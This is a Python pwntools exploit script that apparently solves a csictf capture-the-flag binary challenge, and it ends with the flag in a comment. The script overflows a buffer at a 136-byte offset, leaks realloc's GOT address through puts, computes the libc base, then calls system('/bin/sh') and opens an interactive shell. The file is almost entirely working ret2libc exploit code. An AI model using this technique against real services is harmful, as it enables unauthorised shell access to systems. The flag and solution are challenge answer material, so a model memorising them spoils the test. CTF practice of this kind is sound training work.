from pwn import *

exe = ELF("hello")
libc = ELF("libc.so.6")
HOST = "localhost"
PORT = 9006
p = remote(HOST, PORT)
print()
p.recvline()
offset = 136

log.info("leak libc_base...")
payload = b"M" * offset
payload += p32(exe.plt["puts"])  # calling puts to print the address of printf
payload += p32(exe.sym["main"])  # jump to the start of main
payload += p32(exe.got["realloc"])  # this is the argument of puts
p.sendline(payload)
sleep(1.5)

p.recvuntil("!\n")
realloc = u32(p.recv(4))  # convert to int the address printed
log.success("realloc leaked --> %s"%hex(realloc))
libc_base = realloc - libc.sym["realloc"]  # calculate the actual address of realloc function
log.success("Libc base address --> %s", hex(libc_base))
log.info("libc base leaked\n\n")
sleep(1.5)

log.info("leaking system address...")
system = libc_base + libc.sym["system"]  # calculate the actual address of the system function
log.info("system leaked")
log.success("system --> %s\n\n" % hex(system))
bin_sh = libc_base + next(libc.search(b"/bin/sh"))  # search in the libc file the string "/bin/sh"
sleep(1.5)

payload = b"A" * offset
payload += p32(system)  # calling system function
payload += b"AAAA"  # padding
payload += p32(bin_sh)  # argument for system

p.recvlines(2)
p.sendline(payload)
sleep(1.5)

p.recvuntil('!\n')
sleep(1)
p.interactive()

# FLAG --> csictf{5up32_m4210_5m45h_8202}
